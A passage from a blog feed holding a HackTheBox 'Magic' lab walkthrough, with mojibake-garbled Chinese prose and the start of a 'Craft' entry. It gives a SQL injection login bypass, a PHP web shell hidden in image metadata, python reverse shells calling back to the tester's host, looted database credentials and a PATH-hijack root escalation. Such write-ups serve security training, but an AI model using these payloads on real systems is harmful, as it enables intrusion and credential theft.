<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -A -Pn -T4 -p- 10.10.10.185</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-04-23 10:22 EDT</span><br><span class="line">Stats: 0:10:27 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 22.07% done; ETC: 11:10 (0:36:54 remaining)</span><br><span class="line">Warning: 10.10.10.185 giving up on port because retransmission cap hit (6).</span><br><span class="line">Nmap scan report for 10.10.10.185</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 65455 closed ports, 78 filtered ports</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)</span><br><span class="line">|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)</span><br><span class="line">|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)</span><br><span class="line"></span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Magic Portfolio</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6500.05 seconds</span><br></pre></td></tr></table></figure>
<p>å¸¸è§„80ç«¯å£ï¼Œè¿›å…¥ç«™ç‚¹å‘ç°æœ‰ä¸€ä¸ªLoginç•Œé¢ï¼Œéšä¾¿è¯•ä¸€ä¸‹ï¼Œåˆæ˜¯å¸¸è§„çš„SQL Injectionï¼ŒBurpä¿®æ”¹æ•°æ®ï¼Œpayloadä¸‡èƒ½å¯†ç <code>admin' or 1=1--+</code>å³å¯ã€‚</p>
<p>ç™»å½•æˆåŠŸåï¼Œæœ‰ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡çš„åŠŸèƒ½ï¼Œç»è¿‡å°è¯•ä¹‹åå‘ç°åªèƒ½ä¸Šä¼ å›ºå®šçš„å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶ï¼Œä½†æ˜¯å¥½åƒæ²¡æœ‰å¯¹å›¾ç‰‡å†…å®¹è¿›è¡Œæ£€æŸ¥ã€‚éšä¾¿æ‰¾ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶ï¼Œç”¨exiftoolå·¥å…·å†™å…¥payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exiftool -Comment&#x3D;&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; normal.jpg</span><br></pre></td></tr></table></figure>
<p>æ›´æ”¹åç¼€åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv normal.jpg normal.php.jpg</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ æ–‡ä»¶åï¼Œåœ¨ä¸»é¡µæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°ä¸Šä¼ å›¾ç‰‡çš„ç›¸å¯¹è·¯å¾„æ˜¯<code>images/uploads/normal.php.jpg</code>ï¼Œè®¿é—®è¯¥è·¯å¾„å‘ç°å¯ä»¥æ­£å¸¸å›æ˜¾ã€‚</p>
<p>å†åœ¨urlä¸Šæ·»åŠ ä¸‹é¢å†…å®¹ä½œä¸ºcmdå‚æ•°ï¼Œç”¨æ¥æ‰§è¡Œreverse shellï¼Œåœ¨æœ¬æœºç›‘å¬ç›¸åº”çš„ç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„ï¼šè¿™ä¸ªé¶æœºåªæœ‰python3çš„ç¯å¢ƒ</p>
</blockquote>
<p>æˆåŠŸæ‹¿åˆ°www-dataæƒé™ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">10.10.10.185: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.14.16] from (UNKNOWN) [10.10.10.185] 58816</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">$ python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$ cd ..&#x2F;..&#x2F;</span><br><span class="line">cd ..&#x2F;..&#x2F;</span><br><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ ls</span><br><span class="line">ls</span><br><span class="line">assets  db.php5  images  index.php  login.php  logout.php  upload.phpwww-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ cat db.php5</span><br><span class="line">cat db.php5</span><br><span class="line">&lt;?php</span><br><span class="line">class Database</span><br><span class="line">&#123;</span><br><span class="line">    private static $dbName &#x3D; &#39;Magic&#39; ;</span><br><span class="line">    private static $dbHost &#x3D; &#39;localhost&#39; ;</span><br><span class="line">    private static $dbUsername &#x3D; &#39;theseus&#39;;</span><br><span class="line">    private static $dbUserPassword &#x3D; &#39;iamkingtheseus&#39;;</span><br><span class="line"></span><br><span class="line">    private static $cont  &#x3D; null;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        die(&#39;Init function is not allowed&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function connect()</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; One connection through whole application</span><br><span class="line">        if ( null &#x3D;&#x3D; self::$cont )</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                self::$cont &#x3D;  new PDO( &quot;mysql:host&#x3D;&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname&#x3D;&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);</span><br><span class="line">            &#125;</span><br><span class="line">            catch(PDOException $e)</span><br><span class="line">            &#123;</span><br><span class="line">                die($e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        return self::$cont;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function disconnect()</span><br><span class="line">    &#123;</span><br><span class="line">        self::$cont &#x3D; null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·åæ˜¯<code>theseus</code>ï¼Œå¯†ç æ˜¯<code>iamkingtheseus</code>ï¼Œå°è¯•ç”¨è¿™ä¸ªå¯†ç åˆ‡æ¢ç”¨æˆ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ su theseus</span><br><span class="line">su theseus</span><br><span class="line">Password: iamkingtheseus</span><br><span class="line"></span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure>
<p>å¯†ç é”™è¯¯ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯MySQLæ•°æ®åº“çš„ç™»å½•å¯†ç ã€‚å½“æˆ‘å‡†å¤‡ç”¨mysqlå‘½ä»¤æ—¶ï¼Œæç¤ºæˆ‘<code>apt-get install</code>ï¼Œä½†æ˜¯é¶æœºä¸Šæ˜æ˜å°±è¿è¡Œç€MySQLæœåŠ¡ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ ls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysql</span><br><span class="line">ls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysql</span><br><span class="line">-rwxr-xr-x  1 root root     3627200 Jan 21 06:10 mysql_config_editor</span><br><span class="line">-rwxr-xr-x  1 root root    22558552 Jan 21 06:10 mysql_embedded</span><br><span class="line">-rwxr-xr-x  1 root root     5179616 Jan 21 06:10 mysql_install_db</span><br><span class="line">-rwxr-xr-x  1 root root     3616952 Jan 21 06:10 mysql_plugin</span><br><span class="line">-rwxr-xr-x  1 root root     3784424 Jan 21 06:10 mysql_secure_installation</span><br><span class="line">-rwxr-xr-x  1 root root     3653288 Jan 21 06:10 mysql_ssl_rsa_setup</span><br><span class="line">-rwxr-xr-x  1 root root     3569976 Jan 21 06:10 mysql_tzinfo_to_sql</span><br><span class="line">-rwxr-xr-x  1 root root     4442320 Jan 21 06:10 mysql_upgrade</span><br><span class="line">-rwxr-xr-x  1 root root     3799752 Jan 21 06:10 mysqladmin</span><br><span class="line">lrwxrwxrwx  1 root root          10 Jan 21 06:10 mysqlanalyze -&gt; mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root     4068280 Jan 21 06:10 mysqlbinlog</span><br><span class="line">-rwxr-xr-x  1 root root     3825320 Jan 21 06:10 mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root       26952 Jan 21 06:10 mysqld_multi</span><br><span class="line">-rwxr-xr-x  1 root root       28448 Jan 21 06:10 mysqld_safe</span><br><span class="line">-rwxr-xr-x  1 root root     3875176 Jan 21 06:10 mysqldump</span><br><span class="line">-rwxr-xr-x  1 root root        7865 Jan 21 06:10 mysqldumpslow</span><br><span class="line">-rwxr-xr-x  1 root root     3791912 Jan 21 06:10 mysqlimport</span><br><span class="line">lrwxrwxrwx  1 root root          10 Jan 21 06:10 mysqloptimize -&gt; mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root     4286120 Jan 21 06:10 mysqlpump</span><br><span class="line">lrwxrwxrwx  1 root root          10 Jan 21 06:10 mysqlrepair -&gt; mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root       39016 Jan 12  2018 mysqlreport</span><br><span class="line">-rwxr-xr-x  1 root root     3790504 Jan 21 06:10 mysqlshow</span><br><span class="line">-rwxr-xr-x  1 root root     3809512 Jan 21 06:10 mysqlslap</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°äº† <a href="https://support.hostway.com/hc/en-us/articles/360000220190-How-to-backup-and-restore-MySQL-databases-on-Linux">dump MySQL database</a>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump --databases Magic -utheseus -piamkingtheseus</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç <code>admin:Th3s3usW4sK1ng</code>ã€‚</p>
<p>å†æŠŠæœ¬æœºçš„SSH public keyåŠ å…¥åˆ°é¶æœºçš„<code>/home/thesues/.ssh/authenticated_keys</code>ï¼ŒSSHç›´æ¥ç™»å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh theseus@10.10.10.185</span><br><span class="line">The authenticity of host &#39;10.10.10.185 (10.10.10.185)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;10.10.10.185&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU&#x2F;Linux 5.3.0-42-generic x86_64)</span><br><span class="line"></span><br><span class="line">* Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line">* Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line">* Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line">* Canonical Livepatch is available for installation.</span><br><span class="line">  - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch</span><br><span class="line">     </span><br><span class="line">29 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span><br><span class="line">Last login: Sat Apr 25 22:27:50 2020 from 10.10.14.44</span><br><span class="line">theseus@ubuntu:~$ id</span><br><span class="line">uid&#x3D;1000(theseus) gid&#x3D;1000(theseus) groups&#x3D;1000(theseus),100(users)</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>æŸ¥æ‰¾SUIDæ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:~&#x2F;.ssh$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;arping</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;vmware-user-suid-wrapper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">...</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;sysinfo</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‘ç°ä¸€ä¸ªä¸å¤ªå¯»å¸¸SUIDï¼š<code>sysinfo</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:~$ file &#x2F;bin&#x2F;sysinfo</span><br><span class="line">file &#x2F;bin&#x2F;sysinfo</span><br><span class="line">&#x2F;bin&#x2F;sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:~$ sysinfo</span><br><span class="line">sysinfo</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hardware Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">H&#x2F;W path           Device      Class      Description</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">                               system     VMware Virtual Platform</span><br><span class="line">&#x2F;0                             bus        440BX Desktop Reference Platform</span><br><span class="line">&#x2F;0&#x2F;0                           memory     86KiB BIOS</span><br><span class="line">&#x2F;0&#x2F;1                           processor  AMD EPYC 7401P 24-Core Processor</span><br><span class="line">&#x2F;0&#x2F;1&#x2F;0                         memory     16KiB L1 cache</span><br><span class="line">&#x2F;0&#x2F;1&#x2F;1                         memory     16KiB L1 cache</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;17.5                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;17.6                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;17.7                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18                      bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.1                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.2                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.3                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.4                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.5                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.6                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.7                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;46              scsi0       storage    </span><br><span class="line">&#x2F;0&#x2F;46&#x2F;0.0.0        &#x2F;dev&#x2F;cdrom  disk       VMware IDE CDR00</span><br><span class="line">&#x2F;1                             system     </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Disk &#x2F;dev&#x2F;loop0: 3.7 MiB, 3825664 bytes, 7472 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk &#x2F;dev&#x2F;loop1: 54.5 MiB, 57151488 bytes, 111624 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk &#x2F;dev&#x2F;loop11: 3.7 MiB, 3862528 bytes, 7544 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;CPU Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">processor	: 0</span><br><span class="line">vendor_id	: AuthenticAMD</span><br><span class="line">cpu family	: 23</span><br><span class="line">model		: 1</span><br><span class="line">model name	: AMD EPYC 7401P 24-Core Processor</span><br><span class="line">stepping	: 2</span><br><span class="line">microcode	: 0x8001230</span><br><span class="line">cpuid level	: 13</span><br><span class="line">wp		: yes</span><br><span class="line">flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor</span><br><span class="line">bugs		: fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypass</span><br><span class="line">bogomips	: 4000.00</span><br><span class="line">TLB size	: 2560 4K pages</span><br><span class="line">clflush size	: 64</span><br><span class="line">cache_alignment	: 64</span><br><span class="line">address sizes	: 43 bits physical, 48 bits virtual</span><br><span class="line">power management:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;MEM Usage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">              total        used        free      shared  buff&#x2F;cache   available</span><br><span class="line">Mem:           3.8G        566M        2.4G        4.0M        929M        3.1G</span><br><span class="line">Swap:          947M          0B        947M</span><br></pre></td></tr></table></figure>
<p>sysinfoæ˜¾ç¤ºå‡ºæ¥çš„å†…å®¹ä¸»è¦åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†</p>
<ul>
<li>Hardware Info</li>
<li>Disk Info</li>
<li>CPU Info</li>
<li>Mem Usage</li>
</ul>
<p>æŸ¥é˜…äº†Forumä¸Šå‰è¾ˆä»¬ç»™çš„æç¤ºï¼Œå‘ç°<code>sysinfo</code>æ˜¯å››ä¸ªLinuxå‘½ä»¤çš„ç»„åˆè°ƒç”¨ï¼š</p>
<ul>
<li>Hardware Info = <code>lshw -short</code></li>
<li>Disk Info = <code>fdisk -l</code></li>
<li>CPU Info = <code>cat /proc/cpuinfo</code></li>
<li>Mem Usage = <code>free -h</code></li>
</ul>
<p>æ—¢ç„¶<code>sysinfo</code>è°ƒç”¨çš„æ˜¯åŸç”Ÿçš„Linuxå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ”¹å˜<code>PATH</code>å˜é‡ï¼Œåˆ›å»ºä¸€ä¸ªå†…å®¹ç”±è‡ªå·±å†³å®šï¼Œæ–‡ä»¶åä¸ºä¸Šé¢å››ç§ä»»æ„ä¸€ä¸ªçš„â€œäºŒè¿›åˆ¶æ–‡ä»¶â€ï¼Œå…·ä½“è€Œè¨€ï¼š</p>
<p>åœ¨<code>/tmp/magic</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>fdisk</code>æ–‡ä»¶ï¼Œç„¶åå‘å…¶ä¸­å†™å…¥reverse shellï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ touch fdisk</span><br><span class="line">touch fdisk</span><br><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ echo python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk</span><br><span class="line">&lt;(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk</span><br></pre></td></tr></table></figure>
<p>æ›´æ”¹æƒé™755</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ chmod fdisk 755</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°†<code>/tmp/magic</code>ç›®å½•å†™åˆ°<code>PATH</code>ç¯å¢ƒå˜é‡ä¸­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ export PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATH</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ›´è¯¦ç»†çš„è§£é‡Šå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
</blockquote>
<p>è¿™æ ·å°±è¾¾åˆ°äº†ç›®çš„ï¼Œå³<code>sysinfo</code>ä¼šå»æ‰§è¡Œ<code>/tmp/magic</code>ç›®å½•ä¸‹çš„<code>fdisk</code></p>
<p>æœ¬æœºç›‘å¬1234ç«¯å£ï¼Œé¶æœºè¿è¡Œ<code>sysinfo</code>å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ncat: Connection from 10.10.10.185:45410.</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">root@ubuntu:&#x2F;tmp# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<ul>
<li>åˆ©ç”¨SQL Injectionç™»å½•ä¸Šä¼ å›¾ç‰‡é¡µé¢</li>
<li>ä½¿ç”¨exiftoolå·¥å…·å‘æ­£å¸¸å›¾ç‰‡æ·»åŠ web shell</li>
<li>ä¸Šä¼ å›¾ç‰‡è·å¾—<code>www-data</code>çš„reverse shell</li>
<li>ä»<code>db.php5</code>è·å¾—MySQLæ•°æ®åº“çš„ç™»å½•åå’Œå¯†ç </li>
<li>ä½¿ç”¨<code>mysqldump</code>å¤‡ä»½æ•°æ®åº“ï¼Œå¾—åˆ°ç½‘ç«™çš„adminå¯†ç ï¼Œå³ç”¨æˆ·<code>theseus</code>çš„suå¯†ç </li>
<li>åˆ†æ<code>sysinfo</code>çš„è¾“å‡ºä¿¡æ¯</li>
<li>ä½¿ç”¨<code>PATH</code>å˜é‡ææƒ</li>
</ul>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Craft-walkthrough</title>
    <url>/Target_drone/HackTheBox/16.HTB-Craft-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Craft-Walkthrough">HTB::Craft Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503114541.png" style="zoom: 80%;" />
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>REST API</li>
<li>Git commit history</li>
<li>Vault OTP</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Inital-Enumeration">Inital Enumeration</h3>
<p>ç«¯å£æ‰«æ</p>
